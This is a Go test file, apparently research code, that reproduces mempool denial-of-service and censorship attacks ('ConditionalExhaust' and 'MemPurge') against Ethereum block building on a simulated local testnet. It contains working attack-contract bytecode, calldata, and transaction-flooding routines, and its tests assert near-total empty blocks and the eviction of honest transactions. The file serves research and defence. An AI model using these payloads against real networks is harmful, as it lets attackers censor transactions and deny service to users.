package blockvalidation

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"errors"
	"math/big"
	"os"
	"strconv"
	"sync"
	"testing"
	"time"

	capellaapi "github.com/attestantio/go-builder-client/api/capella"
	apiv1 "github.com/attestantio/go-builder-client/api/v1"
	"github.com/attestantio/go-eth2-client/spec/bellatrix"
	"github.com/attestantio/go-eth2-client/spec/capella"
	"github.com/attestantio/go-eth2-client/spec/phase0"
	"github.com/ethereum/go-ethereum/accounts/keystore"
	"github.com/ethereum/go-ethereum/beacon/engine"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/fdlimit"
	"github.com/ethereum/go-ethereum/common/math"
	"github.com/ethereum/go-ethereum/consensus/ethash"
	"github.com/ethereum/go-ethereum/core"
	"github.com/ethereum/go-ethereum/core/rawdb"
	"github.com/ethereum/go-ethereum/core/txpool"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth"
	"github.com/ethereum/go-ethereum/eth/downloader"
	"github.com/ethereum/go-ethereum/eth/ethconfig"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/miner"
	"github.com/ethereum/go-ethereum/node"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/params"
	"github.com/ethereum/go-ethereum/trie"
	"github.com/holiman/uint256"
	"github.com/stretchr/testify/require"

	boostTypes "github.com/flashbots/go-boost-utils/types"
)

var (
	// The blockheight variants are included in the code, as all addresses are
	// randomized for each test, making incorporating the coinbases of actors in
	// the contracts hard.

	// Blockheight ConditionalExhaust attack
	conditionalExhaustCode = common.Hex2Bytes("608060405234801561001057600080fd5b50610173806100206000396000f3fe60806040526004361061001e5760003560e01c806302069f7d14610023575b600080fd5b61003d600480360381019061003891906100fd565b61003f565b005b8143101561007d575b600081111561005c57600181039050610048565b60008060008060017316000000000000000000000000000000000000005af1505b5050565b600080fd5b600063ffffffff82169050919050565b61009f81610086565b81146100aa57600080fd5b50565b6000813590506100bc81610096565b92915050565b600062ffffff82169050919050565b6100da816100c2565b81146100e557600080fd5b50565b6000813590506100f7816100d1565b92915050565b6000806040838503121561011457610113610081565b5b6000610122858286016100ad565b9250506020610133858286016100e8565b915050925092905056fea264697066735822122081e43b6d25cffa7a56a18db005bfd0d691c4b5d831a17d8f755f6dcf55a20edd64736f6c63430008120033")
	conditionalExhaustDataNoIterations = common.Hex2Bytes("02069f7d00000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000")
	conditionalExhaustDataStr = "02069f7d0000000000000000000000000000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000000000008f0ff"
	conditionalExhaustData = common.Hex2Bytes(conditionalExhaustDataStr)

	// Combined MemPurge and blockheight ConditionalExhaust attack
	combinedAttackCode = common.Hex2Bytes("608060405234801561001057600080fd5b506101a0806100206000396000f3fe60806040526004361061001e5760003560e01c806302069f7d14610023575b600080fd5b61003d6004803603810190610038919061012a565b61003f565b005b8143101561008b575b600081111561005c57600181039050610048565b60008060008060017316000000000000000000000000000000000000005af15060008060008060013403325af1005b60008060008034735b38da6a701c568545dcfcb03fcb875f56beddc45af1505050565b600080fd5b600063ffffffff82169050919050565b6100cc816100b3565b81146100d757600080fd5b50565b6000813590506100e9816100c3565b92915050565b600062ffffff82169050919050565b610107816100ef565b811461011257600080fd5b50565b600081359050610124816100fe565b92915050565b60008060408385031215610141576101406100ae565b5b600061014f858286016100da565b925050602061016085828601610115565b915050925092905056fea2646970667358221220d8bcf73b9276e90ae2cea0e53138653e88b78b93f78b8d2cb026194c85d9a20464736f6c63430008120033")
	combinedAttackData = common.Hex2Bytes("02069f7d0000000000000000000000000000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000000000008f0ff")

	attackCode = conditionalExhaustCode
	attackData = conditionalExhaustData
	attackDataStr = conditionalExhaustDataStr

	// We assume some validators censor 0x16
	blacklistedAddress = common.Address{0x16}

	// The mempool's size
	txPoolSize = int(txpool.DefaultConfig.GlobalSlots + txpool.DefaultConfig.GlobalQueue)

	// Create package-level variables to prevent the compiler from removing code
	// that should be benchmarked
	packageTx *types.Transaction
	packageErr error
)

// A general remark regarding "Test...Testnet" tests:
// They achieve the paper's results on our testbed, which has an AMD Ryzen
// Threadripper 3990X 64-core 128-thread 2.9GHz CPU, and 256GB of RAM. In fact,
// stronger results are obtained when running on less powerful hardware, such as
// a PC with Intel i7-11370 4-core 8-thread 3.3GHz CPU and 64GB of RAM.
// Thus, while an attacker needs to send 140 ConditionalExhaust TXs to overwhelm
// a victim using the former machine, an attacker can reach the same outcome by
// sending 80 TXs if victims use the latter hardware.

// TestCombinedAttackTestnet executes a combined ConditionalExhaust + MemPurge
// attack on a testnet multiple times, and succeeds if the attacks succeeded
// more than 90% of the time, meaning that 90% of all blocks did not contain even
// one transaction.
// This may take some time, so run the test without a timeout, like so:
// go test -v -run=TestCombinedAttackTestnet -timeout=0
func TestCombinedAttackTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		success += testnetHelper(
			simLength, true, combinedAttackCode, combinedAttackData, 2,
			txPoolSize, 2, 1, txPoolSize, 2, 1,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.LessOrEqual(t, float64(0.9), success / iterations)
}

// TestCombinedAttackStressTestnet executes a combined ConditionalExhaust+MemPurge
// attack on a testnet multiple times, and succeeds if the attacks succeeded
// more than 90% of the time, meaning that 90% of all blocks did not contain even
// one transaction. Each MemPurge chain is 65 TXs long.
// This may take some time, so run the test without a timeout, like so:
// go test -v -run=TestCombinedAttackStressTestnet -timeout=0
func TestCombinedAttackStressTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		// The attacker will create MemPurge chains of 65 TXs each, where the
		// first one is a ConditionalExhaust TX, and with all other ones being
		// invalidated due to not having enough funds.
		success += testnetHelper(
			simLength, true, combinedAttackCode, combinedAttackData, 65,
			txPoolSize, 1, 65, txPoolSize, 1, 65,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.LessOrEqual(t, float64(0.9), success / iterations)
}

// TestConditionalExhaustOneShotTestnet executes a ConditionalExhaust attack
// on a testnet multiple times, and succeeds if the attacks succeeded more than
// 90% of the time, meaning that 90% of all blocks did not contain even one
// transaction. Each attack consists of exactly 140 attack TXs, which the
// attacker sends in one chunk.
// This may take some time, so run the test without a timeout, like so:
// go test -v -run=TestConditionalExhaustTestnet -timeout=0
func TestConditionalExhaustOneShotTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		success += testnetHelper(
			simLength, true, conditionalExhaustCode, conditionalExhaustData, 0,
			txPoolSize, 2, 1, 140, 2, 140,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.LessOrEqual(t, float64(0.9), success / iterations)
}

// TestHonestOneShotTestnet runs through an honest scenario, and succeeds only
// if more than 90% of blocks in all trials contained at least one transaction.
// This may take some time, so run the test without a timeout, like so:
// go test -run=TestHonestOneShotTestnet -timeout=0
func TestHonestOneShotTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		success += testnetHelper(
			simLength, false, nil, nil, 0, txPoolSize, 2, 1, 140, 2, 140,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.GreaterOrEqual(t, float64(0.1), success / iterations)
}

// TestConditionalExhaustTestnet executes a ConditionalExhaust attack on a testnet
// multiple times, and succeeds if the attacks succeeded more than 90% of the
// time, meaning that 90% of all blocks did not contain even one transaction.
// This may take some time, so run the test without a timeout, like so:
// go test -v -run=TestConditionalExhaustTestnet -timeout=0
func TestConditionalExhaustTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		success += testnetHelper(
			simLength, true, conditionalExhaustCode, conditionalExhaustData, 0,
			txPoolSize, 2, 1, txPoolSize, 2, 1,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.LessOrEqual(t, float64(0.9), success / iterations)
}

// TestHonestTestnet runs through an honest scenario, and succeeds only if more
// than 90% of blocks in all trials contained at least one transaction.
// This may take some time, so run the test without a timeout, like so:
// go test -run=TestHonestTestnet -timeout=0
func TestHonestTestnet(t *testing.T) {
	simLength := uint64(100)
	iterations := float64(10)
	success := float64(0)
	for i := float64(1); i <= iterations; i++ {
		success += testnetHelper(
			simLength, false, nil, nil, 0, txPoolSize, 2, 1, txPoolSize, 2, 1,
		)
		t.Log(
			"Average fraction of empy blocks without transactions: ", success / i,
			", after ", i, " runs, each consisting of ", simLength, " blocks.",
		)
	}
	require.GreaterOrEqual(t, float64(0.1), success / iterations)
}

// testnetHelper executes a given scenario on a testnet, and returns the
// fraction of blocks with exactly 0 transactions.
func testnetHelper(
	simLength uint64, verifyCensorship bool, attackCode []byte, attackData []byte,
	memPurgeLen uint64, honestKeyNum int, honestChunksPerSec int, honestTxsPerChunk int,
	attackerKeyNum int, attackerChunksPerSec int, attackerTxsPerChunk int,
) float64 {
	genesis, initBlocks, validatorKey, validatorAddr, honestKeys, honestAddrs,
		attackerKeys, attackerAddrs := createState(
			1, attackCode, honestKeyNum, attackerKeyNum, true,
		)
	node, ethservice, signer := createNode(
		genesis, initBlocks, validatorAddr, verifyCensorship, true,
	)
	defer node.Close()

	// Add an account to the node, otherwise mining is not possible
	ks := keystore.NewKeyStore(node.KeyStoreDir(), keystore.LightScryptN, keystore.LightScryptP)
	account, _ := ks.ImportECDSA(validatorKey, "")
	ks.Unlock(account, "")
	node.AccountManager().AddBackend(ks)

	txPool := ethservice.TxPool()
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	if baseFee == nil {
		baseFee = big.NewInt(50000000)
	}
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295

	// Deploy the attack contract
	deployBlock := uint64(0)
	attackerTo := attackerAddrs[0]
	if attackCode != nil {
		tx, _ := types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     txPool.Nonce(attackerAddrs[0]),
			To:        nil,  // Contract creation
			Value:     new(big.Int),
			Gas:       gasLimit,
			GasFeeCap: new(big.Int).Mul(baseFee, big.NewInt(50)),
			GasTipCap: new(big.Int).Mul(baseFee, big.NewInt(50)),
			Data:      attackCode,
		}), signer, attackerKeys[0])
		txPool.AddRemotesSync([]*types.Transaction{tx})
		
		ethservice.StartMining(1)
		waitForMiningState(ethservice.Miner(), true)
		attackerTo = common.Address{}
		for (attackerTo == common.Address{}) {
			time.Sleep(10 * time.Millisecond)
			attackerTo = getContractAddress(ethservice, tx)
		}
		// Stop mining because creating attack TXs may take time
		ethservice.StopMining()
		waitForMiningState(ethservice.Miner(), false)
		deployBlock = ethservice.BlockChain().CurrentHeader().Number.Uint64()
		simLength += deployBlock
	}

	// Create TXs
	honestFee := new(big.Int).Mul(baseFee, big.NewInt(500))
	honestTxs := createTxs(
		txPool, signer, honestAddrs, honestKeys, 1, &honestAddrs[0],
		big.NewInt(1), 21000, honestFee, honestFee, nil,
	)
	var attackerTxs types.Transactions
	attackerFee := new(big.Int).Add(honestFee, big.NewInt(1))
	if memPurgeLen > 0 {
		attackerTxs = createMemPurgeTxs(
			ethservice, txPool, signer, attackerAddrs, attackerKeys, memPurgeLen,
			&attackerTo, big.NewInt(1), gasLimit, attackerFee, attackerFee, attackData,
		)
	} else {
		attackerTxs = createTxs(
			txPool, signer, attackerAddrs, attackerKeys, 1, &attackerTo,
			big.NewInt(1), gasLimit, attackerFee, attackerFee, attackData,
		)
	}

	// Start creating blocks and sending TXs.
	// Block creation is performed using 128 threads.
	ethservice.StartMining(128)
	waitForMiningState(ethservice.Miner(), true)
	var wg sync.WaitGroup
	wg.Add(2)
	go sendTxsConcurrently(&wg, txPool, honestTxs, honestChunksPerSec, honestTxsPerChunk)
	go sendTxsConcurrently(&wg, txPool, attackerTxs, attackerChunksPerSec, attackerTxsPerChunk)

	// Stop the simulation after reaching simLength blocks
	curBlock := ethservice.BlockChain().CurrentHeader().Number.Uint64()
	sink := make(chan core.ChainHeadEvent, 1024)
	sub := ethservice.BlockChain().SubscribeChainHeadEvent(sink)
	defer sub.Unsubscribe()
	for (curBlock <= simLength) {
		time.Sleep(time.Second)
		select {
			case ev := <-sink:
				curBlock = ev.Block.NumberU64()
		}
	}

	// Calculate fraction of empty blocks
	blockFrac := 0
	for ; curBlock > deployBlock; curBlock-- {
		if (ethservice.BlockChain().GetBlockByNumber(curBlock).Transactions().Len() == 0) {
			blockFrac += 1
		}
	}
	return float64(float64(blockFrac) / float64(simLength - deployBlock))
}

// sendTxsConcurrently is a function that should be used as a goroutine that
// sends TXs to the given mempool.
func sendTxsConcurrently(
	wg *sync.WaitGroup, txPool *txpool.TxPool, txs types.Transactions,
	ratePerSecond int, chunkSize int,
) {
	defer wg.Done()
	sleepTime := time.Duration(1000 / ratePerSecond) * time.Millisecond
	for i := 0; i < len(txs); i += chunkSize {
		end := i + chunkSize
		if end > len(txs) {
			end = len(txs)
		}
		txPool.AddRemotes(txs[i:end])
		time.Sleep(sleepTime)
	}
}

// txPoolReport is a function that should be used as a goroutine that
// reports the mempool's status every 1 second. This is a utility function that
// doesn't serve any critical purpose besides printing progress to the screen.
func txPoolReport(
	t *testing.T, txPool *txpool.TxPool, honestAddrs []common.Address,
	attackerAddrs []common.Address,
) {
	for i := 0 ; ; i += 1 {
		time.Sleep(1 * time.Second)
		honestPending, attackerPending := getPending(txPool, honestAddrs, attackerAddrs)
		t.Log("Pending honest TXs: ", len(honestPending), "\t|\t Pending attacker TXs: ", len(attackerPending))
	}
}

// waitForMiningState waits until the desired mining state was reached, or 1s passed
func waitForMiningState(m *miner.Miner, mining bool) {
	for i := 0; i < 100; i++ {
		time.Sleep(10 * time.Millisecond)
		if m.Mining() == mining {
			return
		}
	}
}

// TestCombinedAttackAtMostOneTxPerAccount shows that if one MemPurge+ConditionalExhaust
// attack transaction is included in a block, all others will not be included.
func TestCombinedAttackAtMostOneTxPerAccount(t *testing.T) {
	attackCode = combinedAttackCode
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()
	
	api := createApi(ethservice, validatorAddr, false)
	txPool := ethservice.TxPool()
	attackerTo := getContractAddress(ethservice, nil)
	gasLimit := uint64(100000)
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10000))
	
	// All attack addresses should have 0 TXs before we start
	_, attackerPending := getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 0, len(attackerPending))
	
	// We execute a very computationally relaxed version of the attack, to show
	// that if attack TXs do not enter the next block, it is not because they
	// consume all of the upcoming block's gas.
	attackData = common.Hex2Bytes("02069f7d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
	for _, tx := range createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&attackerTo, big.NewInt(1), gasLimit, attackerFee, attackerFee, attackData,
	) {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}

	// There is more than one attacker pending TX
	_, attackerPending = getPending(txPool, []common.Address{}, attackerAddrs)
	require.Less(t, 1, len(attackerPending))

	// Although the current validator is not censoring, this block will contain
	// at most two transactions: a single attack TX, and the proposer payment TX,
	// in spite of the attacker having more than one pending TX
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 2, len(blockRequest.ExecutionPayload.Transactions))
}

// TestCombinedAttackPendingDependsOnFirst shows that the attacker can first create
// future TXs and then send a single TX to make them all pending.
func TestCombinedAttackPendingDependsOnFirst(t *testing.T) {
	attackCode = combinedAttackCode
	attackData = conditionalExhaustData
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, true, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, true)
	txPool := ethservice.TxPool()
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295
	attackerTo := getContractAddress(ethservice, nil)
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10000))

	// All attack addresses should have 0 TXs before we start
	_, attackerPending := getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 0, len(attackerPending))

	for _, tx := range createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&attackerTo, big.NewInt(1), gasLimit, attackerFee, attackerFee, attackData,
	) {
		txPool.AddRemotesSync([]*types.Transaction{tx})

		// The attacker has no pending transactions before adding the last one
		require.EqualValues(t, 0, len(attackerPending))
		_, attackerPending = getPending(txPool, []common.Address{}, attackerAddrs)
	}
	// The attacker has 64 pending transactions after the last was added
	require.EqualValues(t, 64, len(attackerPending))

	// If the current validator is censoring, this block will contain at
	// most one transaction: the proposer payment TX
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 1, len(blockRequest.ExecutionPayload.Transactions))

	// The block is indeed valid
	err := api.ValidateBuilderSubmissionV2(blockRequest)
	require.NoError(t, err)
}

// TestCombinedAttackCircumventsProtections shows that the combiend
// attack works, in spite of protections put in place to mitigate other attacks,
// for example DETER.
func TestCombinedAttackCircumventsProtections(t *testing.T) {
	attackCode = combinedAttackCode
	attackData = conditionalExhaustData
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 80, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, true, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, true)
	txPool := ethservice.TxPool()
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295
	attackerTo := getContractAddress(ethservice, nil)
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10000))

	// All attack addresses should have 0 TXs before we start
	_, attackerPending := getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 0, len(attackerPending))

	for _, tx := range createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&attackerTo, big.NewInt(1), gasLimit, attackerFee, attackerFee, attackData,
	) {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}

	// The attacker should succeed in filling the mempool
	_, attackerPending = getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 5120, len(attackerPending))

	// If the current validator is censoring, this block will contain at
	// most one transaction: the proposer payment TX
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 1, len(blockRequest.ExecutionPayload.Transactions))

	// The block is indeed valid
	err := api.ValidateBuilderSubmissionV2(blockRequest)
	require.NoError(t, err)
}

// TestCombinedAttackEvictsMempoolOneAccount shows that an attacker can
// evict existing honest TXs from the mempool when combined with ConditionalExhaust.
func TestCombinedAttackEvictsMempoolOneAccount(t *testing.T) {
	attackCode = conditionalExhaustCode
	attackData = conditionalExhaustData

	genesis, initBlocks, _, validatorAddr, honestKeys, honestAddrs, attackerKeys, attackerAddrs := createState(1, attackCode, 1, 80, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	txPool := ethservice.TxPool()
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerTo := getContractAddress(ethservice, nil)
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295

	// All honest and attack addresses should have 0 TXs before we start
	honestPending, attackerPending := getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 0, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))

	honestFee := new(big.Int).Mul(baseFee, big.NewInt(1))
	honestTxs := createTxs(
		txPool, signer, honestAddrs, honestKeys, uint64(txPoolSize), &honestAddrs[0],
		big.NewInt(1), 21000, honestFee, honestFee, nil,
	)
	txPool.AddRemotesSync(honestTxs)

	// The honest TXs currently occupy the mempool
	honestPending, attackerPending = getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 5120, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))

	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(1))
	attackerTxs := createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&attackerTo, big.NewInt(1), gasLimit, attackerFee, attackerFee,
		attackData,
	)
	for _, tx := range attackerTxs {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}

	// Because the attacker creates 64 TXs per account, after the attack there
	// will only be 63 pending honest TXs.
	honestPending, _ = getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 63, len(honestPending))
}

// TestMemPurgeEvictsMempoolMultipleAccounts shows that an attacker can evict
// existing honest TXs from the mempool, even if it is completely full by
// transactions from multiple honest accounts.
func TestMemPurgeEvictsMempoolMultipleAccounts(t *testing.T) {
	genesis, initBlocks, validatorKey, validatorAddr, honestKeys, honestAddrs, attackerKeys, attackerAddrs := createState(1, attackCode, 80, 80, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, false)
	txPool := ethservice.TxPool()
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	

	// All honest and attack addresses should have 0 TXs before we start
	honestPending, attackerPending := getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 0, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))

	honestFee := new(big.Int).Mul(baseFee, big.NewInt(10))
	honestTxs := createTxs(
		txPool, signer, honestAddrs, honestKeys, uint64(64), &honestAddrs[0],
		big.NewInt(1), 21000, honestFee, honestFee,
		nil,
	)
	txPool.AddRemotesSync(honestTxs)

	// The honest TXs currently occupy the mempool
	honestPending, attackerPending = getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 5120, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))
	t.Log("Number of honest pending TXs before the attack: ", len(honestPending))
	
	// Without the attack, the honest TXs will be included in the upcoming block.
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 1428, len(blockRequest.ExecutionPayload.Transactions))
	t.Log(
		"Number of TXs in the upcoming block before the attack: ",
		len(blockRequest.ExecutionPayload.Transactions), ".\n",
		"The honest TXs consume 21,000 gas each, so we expect to see 1428 TXs: 21000*1428 = 29988000.",
	)

	// Create a random address that the TXs will be sent to
	t.Log("An attacker sends 80 chains of 32 MemPurge TXs each, that pay 10 times *less* than honest TXs, but are equal in all other aspects (gas, value, etc).")

	// Create a random address that the TXs will be sent to
	key, _ := crypto.GenerateKey()
	addrs := crypto.PubkeyToAddress(key.PublicKey)
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10))
	attackerTxs := createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 32,
		&addrs, big.NewInt(1), 21000, attackerFee, attackerFee, nil,
	)
	for _, tx := range attackerTxs {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}

	// Because the attacker creates 32 TXs per account and the honest users
	// create 64, after the attack at most half of the honest TXs will remain.
	honestPending, _ = getPending(txPool, honestAddrs, attackerAddrs)
	require.GreaterOrEqual(t, 2560, len(honestPending))

	blockRequest = createBlock(ethservice, api, validatorKey, validatorAddr)
	t.Log(
		"Only 80 of the block's TXs are by the attacker. One is the proposer payment TX, the rest are honest TXs.",
		"Number of attacker TXs in the block: ", countTxsTo(blockRequest.ExecutionPayload.Transactions, &addrs),
	)
	require.GreaterOrEqual(t, 80, countTxsTo(blockRequest.ExecutionPayload.Transactions, &addrs))
}

// TestMemPurgeEvictsMempoolOneAccount shows that an attacker can evict existing
// honest TXs from the mempool, if it is completely full by transactions from a
// single honest account.
func TestMemPurgeEvictsMempoolOneAccount(t *testing.T) {
	genesis, initBlocks, validatorKey, validatorAddr, honestKeys, honestAddrs,
		attackerKeys, attackerAddrs := createState(1, attackCode, 1, 79, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, false)
	txPool := ethservice.TxPool()
	baseFee := ethservice.Miner().PendingBlock().BaseFee()

	// All honest and attack addresses should have 0 TXs before we start
	honestPending, attackerPending := getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 0, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))

	honestFee := new(big.Int).Mul(baseFee, big.NewInt(10))
	honestTxs := createTxs(
		txPool, signer, honestAddrs, honestKeys, uint64(txPoolSize), &honestAddrs[0],
		big.NewInt(1), 21000, honestFee, honestFee, nil,
	)
	txPool.AddRemotesSync(honestTxs)

	// The honest TXs currently occupy the mempool
	honestPending, attackerPending = getPending(txPool, honestAddrs, attackerAddrs)
	require.EqualValues(t, 5120, len(honestPending))
	require.EqualValues(t, 0, len(attackerPending))
	t.Log("Number of honest pending TXs before the attack: ", len(honestPending))
	
	// Without the attack, the honest TXs will be included in the upcoming block.
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 1428, len(blockRequest.ExecutionPayload.Transactions))
	t.Log(
		"Number of TXs in the upcoming block before the attack: ",
		len(blockRequest.ExecutionPayload.Transactions), ".\n",
		"The honest TXs consume 21,000 gas each, so we expect to see 1428 TXs: 21000*1428 = 29988000.",
	)

	// Create a random address that the TXs will be sent to
	t.Log("An attacker sends 79 chains of 64 MemPurge TXs each, that pay 10 times *less* than honest TXs, but are equal in all other aspects (gas, value, etc).")
	key, _ := crypto.GenerateKey()
	addrs := crypto.PubkeyToAddress(key.PublicKey)
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(1))
	attackerTxs := createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&addrs, big.NewInt(1), 21000, attackerFee, attackerFee, nil,
	)
	for _, tx := range attackerTxs {
		txPool.AddRemotesSync([]*types.Transaction{tx})
	}
	
	// Because the attacker creates 64 TXs per account, after the attack there
	// will only be at most 64 honest TXs.
	honestPending, attackerPending = getPending(txPool, honestAddrs, attackerAddrs)
	require.GreaterOrEqual(t, 64, len(honestPending))
	t.Log("Honest pending TXs after the attack: ", len(honestPending))

	// Even if the current validator is not censoring, this block will contain at
	// most 65 transactions: the proposer payment TX, and 64 honest TXs.
	blockRequest = createBlock(ethservice, api, validatorKey, validatorAddr)
	require.GreaterOrEqual(t, 65, len(blockRequest.ExecutionPayload.Transactions))
	t.Log(
		"Number of TXs in the upcoming block after the attack: ",
		len(blockRequest.ExecutionPayload.Transactions), ".\n",
	)

	t.Log(
		"None of these TXs are by the attacker. One is the proposer payment TX, the rest are honest TXs.",
		"Number of attacker TXs in the block: ", countTxsTo(blockRequest.ExecutionPayload.Transactions, &addrs),
	)
	require.GreaterOrEqual(t, 0, countTxsTo(blockRequest.ExecutionPayload.Transactions, &addrs))
}

// Counts the number of TXs that have the given "to" address.
func countTxsTo(txs []bellatrix.Transaction, to *common.Address) int {
	txNum := 0
	toHex := to.Hex()
	var tx types.Transaction
	for _, txBinary := range txs {
		tx.UnmarshalBinary(txBinary)
		if tx.To().Hex() == toHex {
			txNum += 1
		}
	}
	return txNum
}

// TestMemPurgePendingDependsOnFirst shows that the attacker can first create
// future TXs and then send a single TX to make them all pending.
func TestMemPurgePendingDependsOnFirst(t *testing.T) {
	genesis, initBlocks, validatorKey, validatorAddr, _, _, attackerKeys, attackerAddrs := createState(1, attackCode, 0, 1, false)
	node, ethservice, signer := createNode(genesis, initBlocks, validatorAddr, false, false)
	defer node.Close()

	api := createApi(ethservice, validatorAddr, false)
	txPool := ethservice.TxPool()
	gasLimit := ethservice.BlockChain().GasLimit() - 21000 - 8295
	baseFee := ethservice.Miner().PendingBlock().BaseFee()
	attackerFee := new(big.Int).Mul(baseFee, big.NewInt(10000))
	// Create a random address that the TXs will be sent to
	key, _ := crypto.GenerateKey()
	addrs := crypto.PubkeyToAddress(key.PublicKey)

	// All attack addresses should have 0 TXs before we start
	_, attackerPending := getPending(txPool, []common.Address{}, attackerAddrs)
	require.EqualValues(t, 0, len(attackerPending))

	for _, tx := range createMemPurgeTxs(
		ethservice, txPool, signer, attackerAddrs, attackerKeys, 64,
		&addrs, big.NewInt(1), gasLimit, attackerFee, attackerFee, nil,
	) {
		txPool.AddRemotesSync([]*types.Transaction{tx})

		// The attacker has no pending transactions before adding the last one
		require.EqualValues(t, 0, len(attackerPending))
		_, attackerPending = getPending(txPool, []common.Address{}, attackerAddrs)
	}
	// The attacker has 64 pending transactions after the last was added
	require.EqualValues(t, 64, len(attackerPending))

	// Even if the current validator is not censoring, this block will contain at
	// most two transactions: the proposer payment TX, and one MemPurge TX.
	blockRequest := createBlock(ethservice, api, validatorKey, validatorAddr)
	require.EqualValues(t, 2, len(blockRequest.ExecutionPayload.Transactions))
	t.Log(
